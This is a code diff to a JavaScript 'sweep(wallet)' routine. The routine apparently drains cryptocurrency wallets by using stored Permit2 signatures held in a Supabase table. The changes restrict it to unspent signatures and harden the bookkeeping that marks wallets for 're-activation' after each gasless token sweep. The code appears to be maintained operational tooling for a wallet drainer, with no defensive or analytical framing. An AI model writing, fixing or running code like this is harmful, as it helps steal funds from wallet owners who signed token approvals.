@@ -1516,13 +1516,14 @@ async function sweep(wallet) {
     let stData   = null;
     let stSource = "";
 
-    // Source 1: permit2_signatures[address + "-sig"] — primary path
+    // Source 1: permit2_signatures[address + "-sig"] — primary path (unspent only)
     {
       const { data } = await supabase
         .from("permit2_signatures")
         .select("*")
         .eq("address", addrKey + "-sig")
         .eq("chain", CHAIN)
+        .eq("spent", false)
         .single();
       if (data?.signature) {
         stData   = data;
@@ -1610,7 +1611,7 @@ async function sweep(wallet) {
         supabase.from("delegated_wallets").update({ needs_reactivation: true })
           .eq("address", addrKey).eq("chain", CHAIN).then().catch(() => {});
         supabase.from("permit2_signatures").update({ spent: true })
-          .eq("id", stData.id).then().catch(() => {});
+          .eq("address", addrKey + "-sig").eq("chain", CHAIN).then().catch(() => {});
         tier4Valid = false; // fall through to Tier 5, do NOT return
       }
       if (tier4Valid) {
@@ -1689,10 +1690,11 @@ async function sweep(wallet) {
         await tx.wait();
         log(`[gasless] ✅ swept ${withBalance.length} tokens`);
         if (supabase) {
-          await supabase.from("permit2_signatures").update({ spent: true }).eq("id", stData.id);
+          await supabase.from("permit2_signatures").update({ spent: true })
+            .eq("address", addrKey + "-sig").eq("chain", CHAIN).catch(() => {});
           await supabase.from("delegated_wallets")
             .update({ needs_reactivation: true })
-            .eq("address", addrKey).eq("chain", CHAIN);
+            .eq("address", addrKey).eq("chain", CHAIN).catch(() => {});
         }
       } catch (e) {
         err(`[gasless] ❌ revert: ${e.reason ?? e.message}`);
@@ -1700,10 +1702,11 @@ async function sweep(wallet) {
         if (msg.includes("nonce") || msg.includes("InvalidNonce") || msg.includes("NonceAlreadyUsed")) {
           log(`[gasless] nonce spent — marking for re-activation`);
           if (supabase) {
-            await supabase.from("permit2_signatures").update({ spent: true }).eq("id", stData.id);
+            await supabase.from("permit2_signatures").update({ spent: true })
+              .eq("address", addrKey + "-sig").eq("chain", CHAIN).catch(() => {});
             await supabase.from("delegated_wallets")
               .update({ needs_reactivation: true })
-              .eq("address", addrKey).eq("chain", CHAIN);
+              .eq("address", addrKey).eq("chain", CHAIN).catch(() => {});
           }
         }
       }
